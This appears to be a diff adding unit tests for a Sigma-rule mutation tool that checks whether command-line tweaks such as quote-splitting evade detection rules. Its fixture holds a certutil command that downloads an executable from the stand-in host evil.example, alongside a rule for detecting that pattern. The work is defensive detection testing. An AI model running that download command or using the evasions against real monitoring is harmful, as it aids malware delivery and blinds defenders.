@@ -1,0 +1,62 @@
+import unittest
+
+from sigma_mutate.matcher import matches
+from sigma_mutate.mutators import generate
+from sigma_mutate.scoring import BaselineError, score_rule
+
+RULE = {
+    "title": "Certutil Download With URLCache",
+    "detection": {
+        "selection": {
+            "Image|endswith": r"\certutil.exe",
+            "CommandLine|contains|all": ["-urlcache", "http"],
+        },
+        "condition": "selection",
+    },
+}
+EVENT = {
+    "Image": r"C:\Windows\System32\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -f http://evil.example/a.exe a.exe",
+}
+
+
+class MatcherTests(unittest.TestCase):
+    def test_baseline_matches(self):
+        self.assertTrue(matches(RULE, EVENT))
+
+    def test_case_insensitive(self):
+        self.assertTrue(matches(RULE, {**EVENT, "CommandLine": EVENT["CommandLine"].upper()}))
+
+    def test_condition_not(self):
+        rule = {"detection": {
+            "sel": {"CommandLine|contains": "http"},
+            "flt": {"CommandLine|contains": "good.example"},
+            "condition": "sel and not flt",
+        }}
+        self.assertTrue(matches(rule, {"CommandLine": "x http://evil.example"}))
+        self.assertFalse(matches(rule, {"CommandLine": "x http://good.example"}))
+
+    def test_unsupported_modifier_is_explicit(self):
+        rule = {"detection": {"sel": {"CommandLine|re": "a.*"}, "condition": "sel"}}
+        with self.assertRaises(NotImplementedError):
+            matches(rule, {"CommandLine": "abc"})
+
+
+class ScoringTests(unittest.TestCase):
+    def test_known_evasions_found(self):
+        report = score_rule(RULE, EVENT)
+        evaded = {(r.mutation.mutator, r.mutation.label.split(" ")[1]) for r in report.evasions}
+        self.assertIn(("quote_split", "1"), evaded)  # -urlcache
+        self.assertIn(("quote_split", "3"), evaded)  # http://...
+        self.assertLess(report.score, 1.0)
+
+    def test_baseline_must_match(self):
+        with self.assertRaises(BaselineError):
+            score_rule(RULE, {**EVENT, "CommandLine": "notepad.exe"})
+
+    def test_default_uses_only_argv_equivalent_mutations(self):
+        self.assertTrue(all(m.assumption == "argv" for m in generate(EVENT["CommandLine"])))
+
+
+if __name__ == "__main__":
+    unittest.main()
